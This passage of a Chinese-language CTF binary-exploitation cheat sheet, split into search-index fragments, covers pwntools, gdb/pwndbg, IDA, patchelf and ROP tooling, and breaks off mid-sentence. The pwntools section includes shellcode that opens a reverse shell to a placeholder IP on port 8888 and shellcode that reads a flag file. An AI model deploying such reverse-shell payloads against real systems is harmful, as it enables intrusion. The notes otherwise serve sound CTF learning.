/glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so patchelf --set-interpreter /tmp/ld-2.27.so ./test LD_PRELOAD=./libc.so.6 ./test 或 from pwn import * p = process([\"/path/to/ld.so\", \"./test\"], env={\"LD_PRELOAD\":\"/path/to/libc.so.6\"}) ","date":"2024-10-09","objectID":"/pwn_note/:1:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"checksec checksec --file={file_name} ","date":"2024-10-09","objectID":"/pwn_note/:1:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Glibc-all-in-one 多版本 libc ./libc-x.xx.so # 查看相应版本的链接器 cd glibc-all-in-one cat list or cat old_list sudo ./download x.xx-xubuntux_amd64 #下载glibc，会存放在libs文件夹中 sudo ./download_old x.xx-xubuntux_xxx #下载old_list中的 若无法下载，可以进入官网（ubuntu、清华镜像）找到 deb 文件自行下载下来拷贝到 debs 文件夹中，libs 相应文件中创建.debug文件，执行： sudo ./extract debs/libc6_x.xx-0ubuntu5_amd64.deb libs/x.xx-0ubuntu5_amd64/ sudo ./extract ~/libc6-dbg_2.26-0ubuntu2_i386.deb libs/x.xx-0ubuntu5_amd64/.debug/ ","date":"2024-10-09","objectID":"/pwn_note/:1:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"LibcSearcher from LibcSearcher import * libc = LibcSearcher(\"printf\", printf_addr) libc_base = write_addr - libc.dump(\"write\") system_addr = libc_base + libc.dump(\"system\") binsh_addr = libc_base + libc.dump(\"str_binsh\") ","date":"2024-10-09","objectID":"/pwn_note/:1:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Patchelf 若无相应链接将会产生错误 ./pwn: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pwn) 一般情况 jshiro@ubuntu:~/Desktop/ctf/smashes$ ldd ./elf linux-vdso.so.1 (0x00007fff3c996000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb20380c000) /lib64/ld-linux-x86-64.so.2 (0x00007fb203a46000) 改变程序的链接库路径，使用工具修改 libc 文件 #生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题 sudo ln ld-x.xx.so /lib64/ld-x.xx.so # libc 和 ld 都需要有可执行权限 chmod 777 xxx, new_libc.so使用相对路径加./ 执行失败可能架构未匹配 patchelf --set-interpreter ld-x.xx.so elf # 来修改文件ld.so patchelf --replace-needed libc.so.6 ./new_libc.so elf # 来修改文件libc.so # 利用 glibc-all-in-one 成功执行 patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./glibc-all-in-one/libs/ubuntu elf 或者 p = process(['~/name/x.xx-3ubuntu1_amd64/ld-x.xx.so', './elf'], env={\"LD_PRELOAD\":'~/name/x.xx-3ubuntu1_amd64/libc.so.6'}) 更改为 ldd ./elf linux-vdso.so.1 (0x00007fff2be66000) ./libc-2.23.so (0x00007f81a8b3b000) ./ld-2.23.so =\u003e /lib64/ld-linux-x86-64.so.2 (0x00007f81a8ee5000) 注意：在单个 libc 版本中还有多个版本，需要多次在本地尝试 show debug-file-directory # usr/lib/debug, 其中包含.build-id 需要在 gdb 中设置 set debug-file-directory debug/ 尽量下载最新版本 ubuntu 或 kali 机，若只有低版本 libc2.31 在后续调试堆时使用 glibc-all-in-one 可能使用不了 gdb ","date":"2024-10-09","objectID":"/pwn_note/:1:6","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"seccomp-tools sudo seccomp-tools dump ./xxx #查看是否存在沙箱保护，只能执行允许的系统调用函数 ","date":"2024-10-09","objectID":"/pwn_note/:1:7","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"tmux 命令行 tmux ls # 查看session tmux new -t name # 创建新的session, name tmux 指令 prefix 默认为ctrl + b，gdb.attach先要打开 tmux ctrl + B + d 可从 tmux 中退出且保留 tmux，重新进入输入tmux a-t name/number ctrl + B + t 显示时间 配置 # Tmux启用鼠标 + 可使用滚轮滑动 touch ~/.tmux.conf set -g mouse on # 启动鼠标 shift选中内容, ctrl+insert复制, shift+insert粘贴 # 右键快捷栏 可拖动 tmux source-file ~/.tmux.conf 复制： ctrl + b + [进入复制模式，移到目标位置 ctrl + 空格键开始复制，方向键移动选择复制区域 alt + w复制选中文本并退出复制模式 按下ctrl + b + ]粘贴文本 Pane 指令： ctrl + b + \" #下方新建 改为- ctrl + b + % #右方新建 改为| ctrl + b + x #关闭 ctrl + b + [space] # 调整布局 ctrl + b + z # 面板缩放, 最大最小化 ctrl + B + 上下左右键 # 转换屏幕 ctrl + B + [ # 可实现上下翻页 Ctrl + b + o #光标切换到下一个窗格 Window 指令： ctrl + b + c # 新建窗口 ctrl + b + \u0026 # 关闭 Ctrl + b + 0~9 # 切换到指定索引窗口 Ctrl + b + p # 切换到上一个窗口 Ctrl + b + n # 切换到下一个窗口 ctrl + b + w # 列出windows ctrl + b + , # 重命名 分屏复用 tmux list-sessions #查看sessions tmux list-windows #查看windows tmux list-panes #查看panes tmux send-keys -t \u003csessions\u003e:\u003cwindows\u003e.\u003cpanes\u003e \"content\" Enter ","date":"2024-10-09","objectID":"/pwn_note/:1:8","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ropper #寻找gadget ropper --file [file_name] --nocolor --search \"汇编指令\" ","date":"2024-10-09","objectID":"/pwn_note/:1:9","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"IDA 注： 一般直接进入Exports中找start IDA 虚拟地址的偏移很可能不可靠 显示机器码：Options \u003e General \u003e Number of opcode bytes \u003e 10 字符串不连接在一起，使用Edit \u003e Export data 选择如何导出 粉色函数表明：外部函数，生成在extern段中 单键 对变量按n重命名，/添加注释 对函数按键x可以看到索引-交叉引用（何处被调用） 按y可以看到函数及变量声明，可以修改参数、数据类型，u可以undefine函数，p将代码分析为函数 r可以将数字转为字符，h还原为数字，u还原为原数据 g输入地址可直接跳转，c让某一个位置变为指令 tab键切换汇编和反编译图 右键 将数字转化为十六进制、十进制、八进制、字符类型显示 \u003e Collapse declarations：折叠一长串变量 \u003e Keypatch \u003e Patcher：修改汇编代码 \u003e Mark as decompiled：标记已经反编译完的 \u003e Copy to assembly：汇编与 c 语言代码对照显示 组合键 shift + F12：Strings window ctrl + s：段信息 补充符号表：制作签名文件 sudo cp /lib/x86_64-linux-gnu/libc.a . # 放入Flair工具文件夹中 ./pelf libc.a libc-2.XX.pat # 生成libc-2.XX.exc中删除注释自动处理冲突 ./sigmake ./libc-2.XX.pat libc-2.XX.sig # 放入IDA sig目录 pc下 # IDA: View \u003e Open subviews \u003e Signatures \u003e 右键 \u003e Apply new signature... 结构体直接创建分析： View \u003e Open subviews \u003e Local types 右键 \u003e Insert or ins键 写入新的结构体，不断更新，F5 重新反编译 struct somestruct{ type xxx; _DWORD unknown_0; //4字节 char buf[64]; //0x40 void* ptr; //指针先用void*，之后可将void更改为对应的数据类型 }; 同样可以使用typedef将长的类型取别名 IDA 例子解析 .rodata:08048668 data db 'a',0 .rodata:08048668 ; DATA XREF: main+49↑o #rodata只读数据节 DATA XREF表示该字符串在main的多少偏移中引用 F5 伪代码 __int64 a1@\u003crbp\u003e // a1 通过 rbp 寄存器传递 setbuf(stdin, 0); setbuf(stdout, 0); //用于将输入输出缓冲区关闭，直接输出到屏幕输入到相应位置 setbuf(bss_start, 0); // 禁用 bss_start 文件流处的缓冲区, 每次读写立即系统调用 LODWORD(x); // 从x中提取低位dword HIDWORD(x); // 从x中提取高位dword (0x4002c7)(var); // 地址形式调用函数 =func(var) *((_QWORD *)o + 3) = a; // 表示将a函数地址放在o指针向后偏移 3 * 8 bytes的位置 IDA 反汇编函数转栈帧： // 变量多尽量使用esp的相对偏移来分析栈帧 char **v3; // ST04_4 int v4; // ST08_4 char src; // [esp+12h] [ebp-10Eh] char buf; // [esp+112h] [ebp-Eh] _DWORD *v8; // [esp+11Ch] [ebp-4h] 栈帧结构：调用函数 foo，则对栈帧进行改变 ","date":"2024-10-09","objectID":"/pwn_note/:1:10","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"pwntools from pwn import * context(log_level = 'debug', arch = 'i386', os = 'linux', terminal = ['tmux', 'sp', '-h']) # log_level='fatal' 完全不输出 context.terminal = ['tmux', 'split-w', '-h'] # 需要保证tmux已经运行 io = process(\"./xxx\") # pid xxxx io = gdb.debug(\"./xxx\") io = remote(\"ip\", port) gdb.attach(io, \"b main\") gdb.attach(io, \"b *$rebase(0x偏移地址)\\nc\") gdb.attach(io, \"c\"*200) text = io.recvline()[a:b] # 可以使用切片获取返回值 io.recv() io.recvline() io.recvuntil(b'xxx\\n') # 直到接受到\\n io.send(p32(0) + b\"abc\\x0a\") # 输入必须为字节流, 前一个sendline可能影响后一个send io.sendline(b\"\") # 自动加一个\\n换行 io.send(b'xxx\\n') # 在送入不包含\\n时还需要人工输入\\n才会getshell io.sendlineafter(b\"xx\", input_something) #取返回值（地址）的方法，输入以 \"a\"结尾 p.recvuntil(b\"0x\") address = int(p.recvuntil(b\"a\", drop=True), 16) # 直接接受0xabc, False不接收\\n addr = int(p.recvline(False), 16) #64位中获取地址 u64(p.recv(6).ljust(8, \"\\x00\")) addr = u64(io.recv(8)) - 10 # 自使用获取栈地址stack addr 0x10需自调整 addr = io.recvuntil(',')[:-1] ebp_addr = int(\"0x\" + str(addr[::-1].hex()), 16) - 0x10 libc.addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - offset heap_base = u64(p.recvuntil(('\\x55', '\\x56'))[-6:].ljust(8, '\\x00'))\u0026~0xFFF # 32位 u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4, \"\\x00\")) # 64位 u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8, \"\\x00\")) # printf %s, %p 不需小端序转换 int(p.recvline()[:-1], 16) leak_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(hex(leak_addr)) success(\"libcBase -\u003e {:#x}\".format(libcBase)) # x表示转化为16进制 打印 # 快捷填充垃圾数据 cyclic(0x10) # p64(8)： 0x0000000000000008 # `\\x00` 为一字节 bin_sh = libc_base_addr + libc.search(b'/bin/sh', , executable=True).__next__() pop_rdi = libc_base_addr + libc.search(asm('pop rdi;ret;')).__next__() io.interactive() shellcode 模块 context.arch = \"amd64\" print(asm(shellcraft.sh())) # shellcode汇编代码直接转化为机器码 32位机器shellcode print(asm(shellcraft.amd64.sh())) # 64位机器的shellcode shellcode = asm(pwnlib.shellcraft.amd64.linux.cat2(\"/flag\", 1, 0x30))#读取/flag，输出到标准输出 shellcode = asm(pwnlib.shellcraft.amd64.linux.socket(\"ipv4\", \"tcp\") +\\ pwnlib.shellcraft.amd64.linux.connect(\"x.x.x.x\", 8888, 'ipv4')+\\ pwnlib.shellcraft.amd64.linux.dupsh('rax')) #反弹shell asm(shellcraft.sh()).ljust(100, b'A') #ljust在shellcode基础上左对齐，后面补充A直到100个 # 32位 shellcode = '' shellcode += shellcraft.open('./flag') shellcode += shellcraft.read('eax','esp',0x100) shellcode += shellcraft.write(1,'esp',0x100) shellcode = asm(shellcode) # 64位 shellcode = '' shellcode += shellcraft.open('./flag') shellcode += shellcraft.read('rax','rsp',0x100) shellcode += shellcraft.write(1,'rsp',0x100) shellcode = asm(shellcode) elf+libc # 返回整型 elf = ELF(\"./xxx\") # 获取ELF文件的信息 hex(next(elf.search(b\"/bin/sh\"))) # 获取/bin/sh的地址 hex(elf.address) # 获取文件基地址 hex(elf.symbols['函数/变量/符号名']) # 获取函数/变量/符号地址 hex(elf.got['函数名']) # 获取函数在got表表项的地址 hex(elf.plt['函数名']) # 获取函数PLT地址 libc = ELF(\"libc.so.6\") # 获取libc文件信息, 若函数在libc中而不在文件的plt中, 使用此找函数偏移 hex(libc.sym['函数名']) # 已泄露出libc基址后获取对应函数 offset = libc.sym['system'] - libc.sym['puts'] ROP rop = ROP(elf) pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0] heap统一函数操作： def add(size): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('size?') p.sendline(str(size)) def edit(idx,content): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('idx?') p.sendline(str(idx)) # 有时为 str(idx).encode() p.recvuntil('content:') p.sendline(content) def show(idx): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('idx?') p.sendline(str(idx)) def delete(idx): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('idx?') p.sendline(str(idx)) ","date":"2024-10-09","objectID":"/pwn_note/:1:11","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"gdb # 更新 https://ftp.gnu.org/gnu/gdb/下载源码，升级gdb tar -zxvf gdb-xx.x.tar.gz cd gdb-xx.x mkdir build cd build ../configure --with-python=/usr/bin/python3.8 --enable-targets=all make \u0026\u0026 make install # apt install texinfo; sudo unlink /usr/local/share/man/man1 # 替换老版本 mv /usr/local/bin/gdb /usr/local/bin/gdb_bak cp ~/gdb-xx.x/gdb/gdb /usr/local/bin/ gdb -v ","date":"2024-10-09","objectID":"/pwn_note/:1:12","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"pwndbg 切换 gdb 插件 gef、peda、pwndbg：vim ~/.gdbinit gdb 中的栈地址很大概率不可靠，且默认关闭了 ASLR #下断点 b malloc # exp调试时下断点在malloc函数 b *0x8048000 # 汇编地址 b main b 9 # c语言行号 b xx if i=100 # 条件断点 b *$rebase(0x偏移地址) # 应对PIE info b #查看断点 d num #删除断点 disable num # 使断点不能 # 断在函数下，先调试找到 call malloc@plt 的地址，再下断点 # 内存硬件断点 watch写断点 awatch读写断点 rwatch读断点 watch *(unsigned long long *)0xabc set args 1 2 3 4 # 设置参数，输入 set *(unsigned long long* )address = xx set $rax = xx set arg = 1 start #进入入口 r #运行 finish # 跳出，执行到函数返回处 # 查看栈帧信息 info frame 0 # 0 为索引 #步进stepin 进入函数 s #C语言级 si #汇编语言级 #步过next 跳过函数 n #C语言级 ni #汇编语言级 c #继续 从断点到另一个断点 u 0xabc # 显示汇编码 u \u0026func backtrace # bt显示函数调用关系 k # 查看函数 return # 从函数出来 # core文件在程序段错误时会产生，通过ulimit命令开启 gdb elf_file core # 调试到dump的位置 gdb elf_file PID #寻找 \u003c正则\u003e search xxx search -p 0xabcdef # 寻找数据 x/10gx $rsp+0x10 # 查看寄存器内容 #打印 p 符号 # 打印符号的值, 如: ptr指针指向的值 p 变量 p sizeof(array_var) p system p \u0026printf # printf函数的地址 p/x *(long *)($rbp-0x40) # 查看rbp-0x40地址处的值，十六进制形式 p/d $rsp # 查看rsp寄存器中的值，十进制形式 p $rsp+0x50 # 查看rsp+0x50的地址 假设回显$1 p $rsp - $1 # 可以此查看rsp与$1地址的距离 x/20gz \u0026_IO_2_1_stdout_ # 查看IO_FILE结构 p _IO_2_1_stdout_ p x = 1 # 改值 p main_arena # 查看main_arena p \u0026main_arena.mutex # 地址 print \u0026__libc_argv[0] # 找到变量地址 p *io@2 # 打印结构体数组io指向的 2个数据结构 dc address num# hexdump查看某地址内容 #格式化字符串中，自动计算格式化参数与address的偏移 fmtarg address # The index of format argument : 10 (\"\\%9$p\") # 求偏移 distance address1 address2 #查看栈 数量 stack xxx # esp 和 ebp 之间的是当前执行的函数的栈帧，ebp 指向的是前一个函数的 ebp 的值 0xffff → 0xfffc ← 'aaa' # 表示0xffff地址处存放着一个指针，指针指向'aaa' telescope address # 类似看栈的方式查看内存 vmmap #获取调试进程中节的虚拟映射地址范围, 可见到内存中的动态链接库区域 vmmap 0xabc # 查看其在虚拟映射地址中位置 libc # libc基址 got # 查看got表 plt # 查看plt表 canary # 查看canary tls # 查看tls p *(struct pthread*)address set detach-on-fork off # 同时调试父进程与子进程 pwndbg # 查看命令 retaddr # 查看返回地址 info sharedlibrary # 显示libc.so.6的调试符号 查看内存： x/nfu \u003caddr\u003e # n：表示要显示的内存单元个数 # f：表示显示方式 x:十六进制 d:十进制 u:十进制无符号整型 o:八进制 # t:二进制 a:十六进制 i:指令地址格式 c:字符格式 # f:浮点数格式 s:字符串形式 # u：表示一个地址单元的长度 b:单字节 h:双字节 w:四字节 g:八字节 x/10gx address # 一般 x/20i func # 查看函数反汇编代码 x/80ga address # 常用 exp 动态调试： exp 的输入 send 前加入raw_input()，然后执行 exp， ps -ef | grep pwn_elf找到 PID 另一个窗口gdb attach PID，在 gdb 中disass main找到漏洞点和结束前的断点位置，b * 0xaaaa，输入c，在 exp 中回车。 或代码中在开头加入gdb.attach(io)，在每次发送 payload 前加入pause()可多次调试，然后终端任意按键查看 gdb 变化 堆调试 fastbin # 查看fastbins heap # 查看堆 arenainfo # 查看main_arena vis # 不同颜色可查看堆情况 tcache # tcache详细信息 try_free addr + 0x10 # 查看是否能够释放某个堆块 解决问题： pwndbg\u003e heap heap: This command only works with libc debug symbols. They can probably be installed via the package manager of your choice. See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html E.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries): sudo apt-get install libc6-dbg sudo dpkg --add-architecture i386 sudo apt-get install libc-dbg:i386 该命令可查看单独调试信息文件的目录show debug-file-directory 用 gdb 进行调试，显示一些堆栈格式需要在 gdb 中设置 debug 文件夹，从glibc-all-in-one中复制.debug文件夹到题目目录中 cp -r ~/tools/glibc-all-in-one/libs/x.xx-3ubuntu1_amd64/.debug/ ./debug 程序运行前 gdb 中设置debug file就能正常使用 gdb 调试符号功能 set debug-file-directory debug/ ","date":"2024-10-09","objectID":"/pwn_note/:1:13","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Pwngdb parseheap # 解析堆的排布 magic # 打印 glibc 中有用的变量和函数 heapinfoall # 打印所有线程堆的信息 bcall # 在所有xx函数调用下断点 tls # 打印线程本地存储地址 fpchain # 显示FILE的链接列表 ","date":"2024-10-09","objectID":"/pwn_note/:1:14","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"gdb-dashboard #下载 适合单独调试 调IOT wget -P ~ https://github.com/cyrus-and/gdb-dashboard/raw/master/.gdbinit pip install pygments GDB 调试组合： pwndbg + Pwngdb：适用于userland pwn gef + Pwngdb：适用于qemu/kernel pwn ","date":"2024-10-09","objectID":"/pwn_note/:1:15","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ROPgadget 生成构造 ROP 链 ROPgadget --binary xxxfile --only \"pop|ret\" | grep rdi # 只含有pop和ret的指令 ROPgadget --binary xxx --ropchain # 自动生成ROP链 ","date":"2024-10-09","objectID":"/pwn_note/:1:16","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"one_gadget one_gadget libc_file # 一个地址就可以完成攻击目的 # 获取libc文件中的一个利用路径，即找到libc偏移xxx地址的地方，满足约束条件即可一步getshell # 构造libcBase + xxx(地址)覆盖return地址即可 one_gadget -b [BuildID[sha1] of libc] #BuildID用file获取 one_gadget xxxxxx -l 2 ","date":"2024-10-09","objectID":"/pwn_note/:1:17","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"VSCODE shift+alt+↓：快捷复制一行 调试时监控双击 \u0026var可以看 var 变量的地址 \u0026var.subvar可以看 var 结构体的其中一个类型变量的地址 滚轮中键下滑可以编辑多行 ","date":"2024-10-09","objectID":"/pwn_note/:1:18","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"git git init # git初始化, 会生成.git文件 git help init # 查看帮助 git status # 查看git commit状态 git add file # 加入cache缓冲区 git add -p file # 交互式添加文件 s拆分 y添加暂存区 n不添加暂存区 q退出 git commit -m \"name\" # 从缓冲区提交 git log --all --graph --decorate --oneline # 查看提交情况及信息 git cat-file -p \u003cobject\u003e # \u003cobject\u003e是一个对象的哈希值, 查看某个commit对象的详细信息 git checkout \u003cobject/branch\u003e # 工作目录和索引切换到指定的对象或引用或分支 git diff \u003cobject\u003e file # 可以查看某个提交与当前工作目录(HEAD)间文件的更改 git diff \u003cobject1\u003e \u003cobject2\u003e file # 比较两次提交间文件变化 git diff --cached # 查看已暂存的更改 git branch # 列出本地分支, * 标记当前分支, -r 远程分支, -a 所有分支 -vv 更详细 git branch \u003cbranch-name\u003e # 创建新分支 git branch --set-upstream-to=\u003cremote_name\u003e/\u003cremote_branch\u003e # 关联本地分支和远程分支 git checkout -b \u003cnew-branch\u003e # 创建并切换到新分支 git merge xx # 合并分支到主分支 git merge --abort # 发生冲突时使用命令暂停 进入文件会有冲突提示, 删除并修改 git add file; git merge --continue # 解决冲突继续前先将文件加入cache缓冲区 git remote # 查看远程仓库 git remote add origin \u003curl\u003e # 将新的远程仓库添加到本地git仓库 git push \u003cremote_name\u003e \u003clocal branch\u003e:\u003cremote branch\u003e # git push origin master:master 本地分支更改提交到远程仓库指定分支 git fetch # 下载最新提交和更新 git pull = git fetch; git merge # 下载最新信息后合并更新到本地分支 git clone --shallow # 只包含最近的提交，而不是整个提交历史 git stash # 临时保存当前工作目录和暂存区的更改到堆栈 git stash pop # 恢复并删除stash vim .gitignore # 将需要忽略不提交的文件写入, 可用正则匹配 ","date":"2024-10-09","objectID":"/pwn_note/:1:19","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Linux readelf readelf -e xxx # 分析ELF程序的工具，可以查看所有节头信息 readelf -S xxx # 节表 readelf -l a.out # 程序头表/段表 整理节表组成内存页, 且按权限分了类, 可以看到未运行文件大小和运行后内存大小 readelf -r a.out # 重定位表 readelf -s a.out # 符号表 主要链接和调试中使用, strip elf命令去掉后IDA分析只能分析出sub_XXXX readelf -S vuln | grep debug #查看是否有调试信息 readelf -s vuln #查看是否去除符号表 objdump objdump -d xxx -M intel # 分析二进制文件的工具 hexdump——分析文件的十六进制 ldd jshiro@ubuntu:~/Desktop/ctf$ ldd elf # 用于查看程序连接的所有库 linux-vdso.so.1 (0x00007ffc561bb000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f17383a4000) /lib64/ld-linux-x86-64.so.2 (0x00007f17385de000) #libc.so.6软连接 strings strings elf # 查看一些字符串如/bin/sh gcc -S # 汇编 -g # gdb调试时显示c源代码而不是汇编代码 -pthread # 使用多线程 --static # 静态链接 -Wall -Wextra # 开启告警 -std=c++11 # 支持c++11 -c # 生成.o目标文件 -E # 进行预编译/预处理 -O1, -O2 # 优化 nasm -f elf32/elf64 xxx # 编译 ld -m elf_i386/elf_x86_64 xxx # 链接 nc nc ip port nc -lvp 8888 -e ./pwn # 映射程序 IO Debian Debian 安装 python 包时不用 pip install 命令，而是直接使用apt install python3-包名 将安装包 tar.gz 下载后解压 tar xzf xxx.tar.gz cd xxx python3 setup.py install # 使用虚拟环境 apt install python3-venv pthon3 -m venv myenv source myenv/bin/activate pip install xxx ","date":"2024-10-09","objectID":"/pwn_note/:1:20","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"libc-database 构建本地 libc 偏移量数据库，可替代 glibc-all-in-one # 下载libc符号表与偏移文件 ./get ./get ubuntu debian ./get all # 下载的libc存放在db中，依赖db通过符号和偏移查找libc版本 # find根据符号和偏移找到libc版本呢 ./find system 0xaaa ./dump libcx_x.xx-xubuntux_xxx # 查找()中libc常用符号和偏移，后面加上system指定查找某符号偏移 # add 手动添加libc库到db ./add libcxxx.so # identify判断某个libc是否已存在于db，支持hash查找 md5sum ./libc-xx.so ./identify md5=xxxxxxxxxxxxxxxxxxxxxx # download 下载与libc ID对应的整个libc到libs目录 ./download libcx_x.xx-xubuntux_xx libc-database中 libc 和 ld 带符号信息，但没有 glibc-all-in-one 中配置的 debug，即在 gdb 调试时无法显示符号信息，需要手动下载： dpkg-deb -x libc6-dbg_x.xx-xubuntux.x_amd64.deb ./sym cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ # 其中file libc和ld会带有with debug_info, not stripped信息 # 最终在gdb中set debug-file-directory xxxx/.debug/ ","date":"2024-10-09","objectID":"/pwn_note/:1:21","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"debuginfod 用于管理 libc 的调试符号信息，ubuntu22.04 以上该功能 gdb 默认启用 【旧版本】 gdb10.1 版本支持 debuginfod，且 elfutils-0.179 后才支持，编译 gdb configure 加入--with-debuginfod vim /etc/debuginfod/ubuntu.urls写入https://debuginfod.ubuntu.com pwndbg 中在~/.gdbinit写入set debuginfod enabled on export DEBUGINFOD_URLS=https://debuginfod.deepin.com ","date":"2024-10-09","objectID":"/pwn_note/:1:22","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"基础知识 ","date":"2024-10-09","objectID":"/pwn_note/:2:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"计组 CPU 架构 CISC复杂指令集：intel、AMD 的 x86 RISC精简指令集：ARM、MIPS、Power PC intel (英特尔)与 amd (超威半导体)是x86架构 CPU 制造商 ARM公司是arm架构 CPU 制造商 CPU amd64是X86架构的CPU，64 位版。amd64又叫X86_64。主流的桌面 PC，笔记本电脑，服务器（包括虚拟机）都在用 X86_64 的 CPU arm64是ARM架构的CPU，64 位版。有些路由器、嵌入式设备、手机、安卓平板电脑在用 arm64 的 CPU MIPS是MIPS架构的CPU。有些嵌入式设备和家用路由器在用 MIPS 的 CPU x86 架构 x86 和 x86_64 : 基于 X86 架构的不同版本, 位数不同，32 位和 64 位，其中x86_64 = x64 = amd64 x86 版本是 Intel 率先研发出 x86 架构, x86_64 版本(也称 x64)是 amd 率先研发 x86 的 64 位版本, 所以 x86_64 也叫 amd64 x86：一个地址存 4 个字节；amd64：一个地址存 8 个字节 CPU 包含 4 个层：Ring0-Ring4，Ring3 为用户态，Ring0 为内核态 ","date":"2024-10-09","objectID":"/pwn_note/:2:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Glibc glibc-2.23：ubuntu16.04 glibc-2.27：ubuntu18.04 加入了 tcache glibc-2.29：ubuntu19.04 glibc-2.30~31：ubuntu20.04 glibc-2.34：ubuntu22.04 删除了 malloc-hook，exit-hook 等一系列 hook ubuntu下查看glibc版本 getconf GNU_LIBC_VERSION ldd --version ./libc.so.6 # 执行libc文件查看版本 strings libc.so.6 | grep ubuntu # 查看给定libc对应ubuntu版本 strings libc.so.6 | grep version # 查看libc版本 编译 glibc wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz # 下载压缩包，其中包括glibc源码，可用于后续gdb dir tar -zxvf glibc-2.31.tar.gz # 解压 cd glibc-2.31 mkdir build \u0026\u0026 cd build CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" \\ # C编译器标志 CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" # C++编译器标志 sudo ../configure=/home/xx/glibc-2.31/amd64 --disable-werror --enable-debug=yes sudo make sudo make install 最终/home/xx/glibc-2.31/amd64目录下有bin etc include lib libexec sbin share var，lib中包含所需的libc-2.31.so和ld-2.31.so文件，patchelf 后可调试 libc 中函数 c 代码 对应出题提供的 libc 和 ld，找到编译后 lib 下的 libc 和 ld 进行 patchelf，并且gdb dir 源代码目录(source/malloc)来调试 libc 函数信息 # gcc -Wl,-rpath指定链接的libc库，-Wl,-dynamic-linker指定动态链接器 gcc -g test.c -Wl,-rpath=/home/x/glibc/amd64/lib -Wl,-dynamic-linker=/home/x/glibc/amd64/lib/ld-linux.so.2 32 位 wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz # 下载压缩包 tar -zxvf glibc-2.31.tar.gz # 解压 cd glibc-2.31 mkdir build \u0026\u0026 cd build CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32\" # C编译器标志 CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32\" # C++编译器标志 sudo ../configure --prefix=/home/xx/glibc-2.31/i686 --host=i686-pc-linux-gnu --disable-werror --enable-debug=yes sudo make sudo make install ","date":"2024-10-09","objectID":"/pwn_note/:2:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Mips 32 个通用寄存器 编号 名称 描述 $0 or $zero 0 号寄存器，始终为 0 $1 or $at 保留寄存器 $2-$3 $v0-$v1 values，保存表达式或函数返回结果 $4-$7 $a0-$a3 argument，作为函数前 4 个参数 $8-$15 $t0-$t7 temporaries，供汇编程序使用的临时寄存器 $16-$23 $s0-$s7 Saved values，子函数使用时需先保存原寄存器的值 $24-$25 $t8-$t9 temporaries，临时寄存器，补充$t0-$t7 $26-$27 $k0-$k1 保留，中断处理函数使用 $28 or $gp Global pointer，全局指针 $29 or $sp Stack pointer，堆栈指针，指向堆栈的栈顶 $30 or $fp Frame pointer，保存栈指针 $31 or $ra Return address，返回地址 特殊寄存器 PC（程序计数器） HI（乘除结果高位寄存器） LO（乘除结果低位寄存器） ","date":"2024-10-09","objectID":"/pwn_note/:2:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Assembly lea 